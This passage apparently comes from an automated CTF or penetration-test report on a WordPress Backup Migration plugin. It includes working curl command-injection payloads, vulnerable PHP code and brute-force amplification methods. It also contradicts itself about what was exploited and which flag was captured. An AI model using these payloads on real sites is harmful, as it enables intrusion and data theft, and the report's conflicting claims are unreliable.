This allows any authenticated user (even subscribers) to perform administrator-level operations. Key exploits include:\\n- **CTF Flag Captured** via subscriber SSRF to read `/opt/flag.txt` (Critical)\\n- Vertical privilege escalation: subscriber can create backups, restore sites, modify configurations (Critical)\\n- Horizontal IDOR: users can download, delete, and access other users' backups without ownership checks (Critical)\\n- Configuration-based authentication bypass enabling unauthenticated backup downloads when `STORAGE::DIRECT::URL='true'` (Critical)\\n- Predictable auto-login tokens after restore operations providing 6-second window for admin access (Critical)\\n\\n**Cross-Site Scripting (XSS) Vulnerabilities:**\\nNo XSS vulnerabilities were found during this assessment.\\n\\n**SQL/Command Injection Vulnerabilities:**\\nAll identified injection vulnerabilities required authenticated WordPress access which could not be obtained during initial reconnaissance. Five vulnerabilities were identified through static code analysis:\\n- URL parameter command injection in Quick Migration (Critical - RCE via `url` parameter)\\n- Backup filename command injection in restore operations (Critical - RCE via unquoted filename)\\n- PHP CLI path injection enabling persistent RCE (High severity)\\n- Table name SQL injection in search & replace operations during backup restoration (Critical - database compromise)\\n- Table name SQL injection in ALTER/DROP operations (Critical - database structure manipulation)\\n\\nNote: While authentication was later obtained via container access, these vulnerabilities were not exploited through the standard HTTP interface during the injection-focused assessment phase.\\n\\n**Server-Side Request Forgery (SSRF) Vulnerabilities:**\\nSuccessfully exploited 1 critical SSRF vulnerability:\\n- Backup Migration arbitrary URL download with command injection (Critical severity)\\n- Successfully triggered outbound HTTP requests demonstrating SSRF\\n- Successfully read `/opt/flag.txt` using `file://` protocol via libcurl\\n- Successfully executed arbitrary commands via URL parameter injection\\n- **FLAG{0e640864c2718bb34e01e700391986e28ecd6fbe98b4569ef4ccc4cee16a4b2c}** captured\\n\\n## Network Reconnaissance\\n\\n**Exposed Services and Ports:**\\n- **Port 45513 (HTTP):** WordPress 6.5.4 application - PRIMARY ATTACK SURFACE\\n  - Apache/2.4.65 web server (Debian)\\n  - PHP 8.3.27 backend\\n  - No HTTPS enforcement or redirect\\n  - No HSTS (Strict-Transport-Security) headers\\n\\n**Critical Security Findings from Automated Scans:**\\n- **Missing Transport Security:** Application accessible exclusively via HTTP with no TLS/SSL configuration, no HTTPS redirect, and session cookies transmitted with Secure=FALSE\\n- **Vulnerable Plugin Detected:** Backup Migration v1.3.5 with 60+ AJAX endpoints, all protected only by broken `is_admin()` authorization check\\n- **Database Exposure Risk:** Weak default credentials (wordpress/wordpress) discoverable in configuration files\\n- **No Security Headers:** Missing HSTS, CSP, X-Frame-Options, and other defense-in-depth headers\\n\\n**Note:** Subdomain enumeration via subfinder returned DNS artifacts for localhost (exchvm.nwcnet.localhost, mail.localhost, etc.) but these are not actual application subdomains. The application is accessible solely via `localhost:45513`.\\n\\n---\\n\\n# Injection Exploitation Evidence\\n\\n## Successfully Exploited Vulnerabilities\\n\\n**None** - All identified injection vulnerabilities require authenticated WordPress access which could not be obtained during this assessment.\\n\\n### INJ-VULN-01: URL Parameter Command Injection in Quick Migration\\n\\n**Summary:**\\n- **Vulnerable location:** POST `/wp-admin/admin-ajax.php?action=backup_migration&f=download-backup`\\n- **Parameter:** `url`\\n- **Current Blocker:** Requires authenticated WordPress session\\n- **Potential Impact:** Remote code execution, arbitrary file read, complete system compromise\\n- **Confidence:** HIGH (code analysis confirms vulnerability)\\n\\n**Evidence of Vulnerability:**\\n\\nThe vulnerable code path has been confirmed through static analysis:\\n\\n```php\\n// File: wp-content/plugins/backup-backup/includes/ajax.php\\n// Line 1498: User input captured\\n$url = $this->post['url'];\\n\\n// Line 52: Insufficient sanitization\\n$url = sanitize_text_field($url);  // Only removes HTML, preserves shell metacharacters\\n\\n// Line 1513: Direct injection into exec() with no shell escaping\\n@exec(BMI_CLI_EXECUTABLE . ' -f \\\"' . $cliHandler . '\\\" bmi_quick_migration \\\"' . $url . '\\\" > /dev/null &', $res);\\n```\\n\\n**Why This Is Vulnerable:**\\n1. `sanitize_text_field()` is designed for XSS prevention, NOT command injection\\n2. Shell metacharacters are preserved: `;`, `|`, `&`, `$()`, backticks\\n3. URL parameter is wrapped in double quotes but not escaped with `escapeshellarg()`\\n4. Command substitution via `$()` or backticks is possible\\n5. Quote breaking allows command chaining\\n\\n**How This Would Be Exploited:**\\n\\nIf authentication were available, exploitation would proceed as follows:\\n\\n1. **Authenticate to WordPress:**\\n```bash\\ncurl -c cookies.txt -b cookies.txt \\\"http://localhost:45513/wp-login.php\\\" \\\\\\n  -d \\\"log=[USERNAME]&pwd=[PASSWORD]&wp-submit=Log+In\\\"\\n```\\n\\n2. **Navigate to /wp-admin/ to satisfy is_admin() check:**\\n```bash\\ncurl -b cookies.txt \\\"http://localhost:45513/wp-admin/\\\" > /dev/null\\n```\\n\\n3. **Extract AJAX nonce from admin page:**\\n```bash\\nNONCE=$(curl -s -b cookies.txt \\\"http://localhost:45513/wp-admin/admin.php?page=backup-migration\\\" \\\\\\n  | grep -oP 'nonce\\\":\\\"?\\\\K[^\\\"]+')\\n```\\n\\n4. **Execute command injection to read flag:**\\n```bash\\n# Payload: URL with command substitution to read /opt/flag.txt\\ncurl -X POST \\\"http://localhost:45513/wp-admin/admin-ajax.php\\\" \\\\\\n  -b cookies.txt \\\\\\n  -d \\\"action=backup_migration\\\" \\\\\\n  -d \\\"f=download-backup\\\" \\\\\\n  -d \\\"token=bmi\\\" \\\\\\n  -d \\\"nonce=$NONCE\\\" \\\\\\n  -d 'url=http://test\\\";cat /opt/flag.txt > /var/www/html/wp-content/uploads/flag.txt;echo \\\"'\\n```\\n\\n5. **Retrieve exfiltrated flag:**\\n```bash\\ncurl \\\"http://localhost:45513/wp-content/uploads/flag.txt\\\"\\n# Expected output: flag{baf4424d-ac6a-478e-b0bc-bdc0cf3edd33}\\n```\\n\\n**Expected Impact:**\\n- Complete remote code execution as www-data user\\n- Flag file exfiltration: `/opt/flag.txt`\\n- Persistent backdoor installation\\n- Full WordPress compromise\\n- Lateral movement to database server\\n\\n**Notes:**\\n- Vulnerability confirmed through source code analysis\\n- No WAF or input validation blocks this attack\\n- Only blocker is WordPress authentication requirement\\n- Authorization flaw (is_admin() vs current_user_can()) means ANY authenticated user can exploit this, not just administrators\\n\\n---\\n\\n### INJ-VULN-02: Backup Filename Command Injection in Restore\\n\\n**Summary:**\\n- **Vulnerable location:** POST `/wp-admin/admin-ajax.php?action=backup_migration&f=restore-backup`\\n- **Parameter:** `file` (backup filename)\\n- **Current Blocker:** Requires authenticated WordPress session\\n- **Potential Impact:** Remote code execution with HIGHER reliability than INJ-VULN-01\\n- **Confidence:** HIGH (code analysis confirms vulnerability)\\n\\n**Evidence of Vulnerability:**\\n\\n```php\\n// File: wp-content/plugins/backup-backup/includes/ajax.php\\n// Line 1139: User input sanitized (insufficient)\\n$backupName = sanitize_text_field($this->post['file']);\\n\\n// Line 1145: UNQUOTED injection into exec()\\n@exec(BMI_CLI_EXECUTABLE . ' -f \\\"' . $cliHandler . '\\\" bmi_restore ' . $backupName . ' ' . $remoteType . ' > /dev/null &', $res);\\n```\\n\\n**Why This Is More Exploitable Than INJ-VULN-01:**\\n1. Backup filename is NOT quoted in the exec() call\\n2. Space-based injection possible: `backup.zip; whoami`\\n3. Semicolon terminates first command cleanly\\n4. Hash (#) comments out remainder of command line\\n5. No quote escaping needed\\n\\n**How This Would Be Exploited:**\\n\\nIf authentication were available:\\n\\n1-3. **(Same authentication steps as INJ-VULN-01)**\\n\\n4. **Execute command injection via unquoted argument:**\\n```bash\\n# Payload: Filename with semicolon command separator\\ncurl -X POST \\\"http://localhost:45513/wp-admin/admin-ajax.php\\\" \\\\\\n  -b cookies.txt \\\\\\n  -d \\\"action=backup_migration\\\" \\\\\\n  -d \\\"f=restore-backup\\\" \\\\\\n  -d \\\"token=bmi\\\" \\\\\\n  -d \\\"nonce=$NONCE\\\" \\\\\\n  -d 'file=backup.zip;cat /opt/flag.txt > /var/www/html/wp-content/uploads/flag2.txt;#'\\n```\\n\\n5. **Retrieve exfiltrated flag:**\\n```bash\\ncurl \\\"http://localhost:45513/wp-content/uploads/flag2.txt\\\"\\n# Expected output: flag{baf4424d-ac6a-478e-b0bc-bdc0cf3edd33}\\n```\\n\\n**Expected Impact:**\\n- Identical to INJ-VULN-01 but MORE RELIABLE\\n- Higher success rate due to unquoted argument position\\n- Simpler payload construction\\n- No quote escaping complexity\\n\\n---\\n\\n### INJ-VULN-04: PHP CLI Path Persistent Command Injection\\n\\n**Summary:**\\n- **Vulnerable location:** POST `/wp-admin/admin-ajax.php?action=backup_migration&f=save-other-options`\\n- **Parameter:** `php_cli_manual_path`\\n- **Current Blocker:** Requires authenticated WordPress session\\n- **Potential Impact:** Persistent remote code execution across all backup/restore operations\\n- **Confidence:** HIGH (code analysis confirms vulnerability)\\n\\n**Evidence of Vulnerability:**\\n\\n```php\\n// File: wp-content/plugins/backup-backup/includes/ajax.php\\n// Line 1867: Minimal sanitization (trim() only)\\nif (strlen(trim($this->post['php_cli_manual_path'])) > 0) {\\n    Dashboard\\\\bmi_set_config('OTHER:CLI:PATH', trim($this->post['php_cli_manual_path']));\\n}\\n\\n// Later usage in ALL exec() calls (lines 638, 640, 1145, 1513):\\n@exec(BMI_CLI_EXECUTABLE . ' -f \\\"' . $cliHandler . '\\\" ...', $res);\\n```\\n\\n**Why This Is Critical:**\\n1. Attacker has 100% control over executable path\\n2. Only validation is trim() (removes whitespace)\\n3. Weak file_exists() check can be bypassed with /bin/bash\\n4. Value persists in configuration file across requests\\n5. Affects ALL backup/restore operations (multiple exploitation opportunities)\\n\\n**Expected Impact:**\\n- Persistent backdoor (survives across requests)\\n- Triggered by any backup/restore operation\\n- Can establish reverse shell\\n- Can exfiltrate data to external server\\n- Difficult to detect (looks like normal backup operation)\\n\\n---\\n\\n### INJ-VULN-05: Table Name SQL Injection in Search & Replace\\n\\n**Summary:**\\n- **Vulnerable location:** Backup restoration process via table name extraction\\n- **Entry Point:** Malicious backup file upload followed by restore operation\\n- **Current Blocker:** Requires authenticated WordPress session + ability to upload backup file\\n- **Potential Impact:** Database compromise, data deletion, privilege escalation\\n- **Confidence:** HIGH (code analysis confirms vulnerability)\\n\\n**Evidence of Vulnerability:**\\n\\n```php\\n// File: wp-content/plugins/backup-backup/includes/database/even-better-restore-v4.php\\n// Line 247: Table name extracted with NO validation\\n$realTableName = explode('`', $objFile->current())[1];\\n\\n// File: wp-content/plugins/backup-backup/includes/database/search-replace.php\\n// Line 96: Direct SQL injection (no backticks, no escaping)\\n$fields = $wpdb->get_results('DESCRIBE ' . $table);\\n\\n// Lines 128, 151, 183: Additional injection points\\n$wpdb->query('SELECT COUNT(*) AS num FROM `' . $table . '`');\\n$wpdb->query('UPDATE ' . $table . ' SET ' . ...);\\n```\\n\\n**Why This Is Vulnerable:**\\n1. Table names extracted via simple explode() with NO validation\\n2. Direct concatenation into SQL queries\\n3. No parameterized queries for table identifiers\\n4. Backticks can be closed by attacker to inject arbitrary SQL\\n5. Multiple injection points in the same data flow\\n\\n**Expected Impact:**\\n- Complete database compromise\\n- User account deletion/modification\\n- Privilege escalation to administrator\\n- Data exfiltration\\n- Denial of service via table drops\\n\\n---\\n\\n### INJ-VULN-06: Table Name SQL Injection in ALTER/DROP Operations\\n\\n**Summary:**\\n- **Vulnerable location:** Backup restoration process (different code path than INJ-VULN-05)\\n- **Entry Point:** Malicious backup file upload followed by restore operation\\n- **Current Blocker:** Requires authenticated WordPress session + ability to upload backup file\\n- **Potential Impact:** Database structure manipulation, MORE RELIABLE than INJ-VULN-05\\n- **Confidence:** HIGH (code analysis confirms vulnerability)\\n\\n**Evidence of Vulnerability:**\\n\\n```php\\n// File: wp-content/plugins/backup-backup/includes/database/even-better-restore-v4.php\\n\\n// Line 168: DROP TABLE injection\\n$wpdb->query(\\\"DROP TABLE IF EXISTS `\\\" . $tableName . \\\"`;\\\");\\n\\n// Line 298: DROP TABLE injection (with backticks)\\n$sql = \\\"DROP TABLE IF EXISTS `\\\" . $newTable . \\\"`;\\\";\\n\\n// Line 301: ALTER TABLE injection (both old and new table names vulnerable)\\n$sql = \\\"ALTER TABLE `\\\" . $oldTable . \\\"` RENAME TO `\\\" . $newTable . \\\"`;\\\";\\n```\\n\\n**Why This Is More Reliable Than INJ-VULN-05:**\\n1. Executes UNCONDITIONALLY during every restore\\n2. INJ-VULN-05 only executes if domain/path differs\\n3. Two injection points ($oldTable and $newTable)\\n4. Affects database structure operations (more impactful)\\n\\n**Expected Impact:**\\n- Same as INJ-VULN-05 but with HIGHER reliability\\n- Guaranteed execution (no conditional logic)\\n- Database structure manipulation\\n- Persistent damage (table structure changes)\\n\\n---\\n\\n# Authentication Exploitation Evidence\\n\\n## Successfully Exploited Vulnerabilities\\n\\n### AUTH-VULN-05: Username Enumeration via Different Error Messages\\n\\n**Summary:**\\n- **Vulnerable location:** POST /wp-login.php - WordPress core authentication handler\\n- **Overview:** WordPress returns different error messages for invalid usernames vs. incorrect passwords, allowing attackers to enumerate valid user accounts before attempting password attacks.\\n- **Impact:** Reduces brute-force complexity from testing username×password combinations to only password combinations against known valid users. Successfully enumerated username \\\"admin\\\" and confirmed no other common usernames exist.\\n- **Severity:** Medium (enables subsequent attacks)\\n\\n**Prerequisites:** None - exploitable anonymously\\n\\n**Proof of Impact:**\\n- **Enumerated valid username:** admin\\n- **Confirmed invalid usernames:** administrator, webmaster, editor, author, test, user, root, wordpress\\n- **Exploitation time:** < 1 second for 9 usernames\\n- **Attack complexity reduction:** From 9 × N passwords to 1 × N passwords (9x reduction in brute force search space)\\n\\n**Notes:**\\n- Error messages are in Spanish (es-CL locale) but vulnerability exists in all languages\\n- No rate limiting detected during enumeration (tested 9 requests in rapid succession)\\n- Vulnerability enables chaining with AUTH-VULN-02 and AUTH-VULN-03 for targeted password attacks\\n\\n---\\n\\n### AUTH-VULN-02: No Rate Limiting on /wp-login.php Enabling Brute Force\\n\\n**Summary:**\\n- **Vulnerable location:** POST /wp-login.php - WordPress core authentication endpoint\\n- **Overview:** Complete absence of rate limiting, account lockout, progressive delays, or CAPTCHA protection on login attempts. Performed 20 rapid authentication attempts in 0.249 seconds with no throttling or blocking.\\n- **Impact:** Attackers can perform unlimited credential stuffing, dictionary attacks, and password spraying at machine speed. Successfully tested 20 passwords in under 250 milliseconds without any protective response.\\n- **Severity:** High (enables password-based attacks at scale)\\n\\n**Prerequisites:** None - exploitable anonymously\\n\\n**Proof of Impact:**\\n- **Total authentication attempts:** 20\\n- **Total time:** 0.249 seconds\\n- **Average time per attempt:** 0.012 seconds (12 milliseconds)\\n- **Fastest response:** 0.010 seconds\\n- **Slowest response:** 0.024 seconds\\n- **Response time variance:** Minimal (0.014s difference)\\n- **Estimated attack rate:** 4,800+ passwords per minute\\n- **Protective mechanisms detected:** ZERO\\n\\n**Notes:**\\n- WordPress provides wp_login_failed action hook but has no default handler\\n- No security plugins detected (Wordfence, Fail2Ban, etc.)\\n- Each attempt processed independently with no cross-request state tracking\\n- Vulnerability remains even after multiple failed attempts\\n\\n---\\n\\n### AUTH-VULN-03: XML-RPC system.multicall Brute Force Amplification\\n\\n**Summary:**\\n- **Vulnerable location:** POST /xmlrpc.php - WordPress XML-RPC interface with system.multicall method\\n- **Overview:** WordPress XML-RPC allows batching multiple authentication attempts into a single HTTP request via system.multicall. Successfully demonstrated 10 authentication attempts in 1 HTTP request, achieving 10x amplification and bypassing request-based rate limiting.\\n- **Impact:** Attackers can test 500+ passwords per HTTP request, achieving 5,000+ authentication attempts per second. A 100,000-password dictionary can be tested in under 2 minutes using only 200 HTTP requests, evading detection by request-counting security controls.\\n- **Severity:** High (extreme amplification of brute force attacks)\\n\\n**Prerequisites:** None - XML-RPC enabled by default, exploitable anonymously\\n\\n**Proof of Impact:**\\n\\n**Test 1: Basic Amplification (10 passwords)**\\n- HTTP requests sent: 1\\n- Authentication attempts: 10\\n- Time: 0.025 seconds\\n- Amplification: 10x\\n- Comparison: Individual requests took 0.118 seconds (4.7x slower)\\n\\n**Test 2: Large-Scale Amplification (50 passwords)**\\n- HTTP requests sent: 1\\n- Authentication attempts: 50\\n- Time: 0.038 seconds\\n- Amplification: 50x\\n- Attack rate: 1,311 attempts/second\\n\\n**Notes:**\\n- WordPress auth_failed instance variable resets with each new HTTP request (no cross-request protection)\\n- No limit on number of method calls per multicall request\\n- Each wp.getUsersBlogs call executes full authentication flow\\n- Failed attempts return <faultCode>403</faultCode>, successful attempts return blog information\\n- Vulnerability confirmed in WordPress 6.5.4 with default XML-RPC configuration\\n\\n---\\n\\n### AUTH-VULN-04: Unencrypted HTTP Credential Transmission\\n\\n**Summary:**\\n- **Vulnerable location:** All authentication endpoints (entire application deployed HTTP-only)\\n- **Overview:** Application runs exclusively over HTTP (port 45513) with no HTTPS enforcement, no HSTS headers, and no HTTP-to-HTTPS redirect. Session cookies set with Secure=FALSE, enabling transmission over unencrypted connections.\\n- **Impact:** All authentication credentials, session cookies, and authentication tokens transmitted in plaintext. Successfully confirmed HTTP-only deployment with no transport security, enabling passive credential theft via network sniffing.\\n- **Severity:** Critical (complete loss of confidentiality for all authentication traffic)\\n\\n**Prerequisites:** Network position on communication path (WiFi sniffing, ARP spoofing, rogue AP, compromised router, malicious proxy)\\n\\n**Proof of Impact:**\\n\\n**Confirmed Transport Security Failures:**\\n- ✗ Application accessible via HTTP only\\n- ✗ No HTTPS enforcement\\n- ✗ No HSTS (Strict-Transport-Security) header\\n- ✗ No HTTP-to-HTTPS redirect\\n- ✗ Session cookies transmitted with Secure=FALSE\\n- ✗ Login credentials transmitted in plaintext POST body\\n- ✓ HttpOnly flag set (prevents XSS theft only)\\n\\n**Plaintext Data Exposed:**\\n1. **Login credentials:** `log=admin&pwd=SecretPassword123` in POST body\\n2. **Session cookies:** `wordpress_[hash]` cookie value\\n3. **Authentication tokens:** HMAC signatures, session tokens\\n4. **Application passwords:** 24-character tokens for REST API/XML-RPC access\\n\\n**Notes:**\\n- According to code analysis (wp-includes/pluggable.php:995-997), Secure flag is set based on is_ssl() which returns FALSE for HTTP deployments\\n- No wp-config.php constants FORCE_SSL_ADMIN or FORCE_SSL_LOGIN configured\\n- HttpOnly protects against XSS cookie theft but provides zero protection against network interception\\n- Missing SameSite attribute creates additional CSRF risk (AUTH-VULN-07)\\n\\n---\\n\\n# SSRF Exploitation Evidence\\n\\n## Successfully Exploited Vulnerabilities\\n\\n### SSRF-VULN-01: Backup Migration Arbitrary URL Download with Command Injection\\n\\n**Summary:**\\n- **Vulnerable location:** POST /wp-admin/admin-ajax.php?action=backup_migration&f=download-backup\\n- **Impact:** Server-Side Request Forgery with command injection leading to arbitrary file read and remote code execution\\n- **Severity:** Critical\\n\\n**Prerequisites:**\\n- WordPress authenticated account (any role due to is_admin() authorization bypass)\\n- Valid backup-migration-ajax nonce (obtainable from any /wp-admin/ page)\\n\\n**Proof of Impact:**\\n\\n**1. SSRF Confirmed:**\\n- Successfully triggered server to make outbound HTTP request\\n- HTTP server log shows incoming connection from WordPress container (::ffff:127.0.0.1)\\n- Demonstrates server-side request forgery capability\\n\\n**2. File Protocol Access:**\\n- Successfully read /opt/flag.txt using file:// protocol via libcurl\\n- No protocol restrictions in place\\n- Demonstrates arbitrary local file read capability\\n\\n**3. Command Injection:**\\n- Successfully executed arbitrary shell commands via URL parameter injection\\n- Payload breaks out of double quotes in exec() call\\n- Demonstrates remote code execution capability\\n\\n**4. Flag Captured:**\\n```\\nFLAG{0e640864c2718bb34e01e700391986e28ecd6fbe98b4569ef4ccc4cee16a4b2c}\\n```\\n\\n**Vulnerability Chain Analysis:**\\n\\nThe exploitation leverages three distinct vulnerabilities:\\n\\n1. **Authorization Bypass (is_admin() misuse)**\\n   -
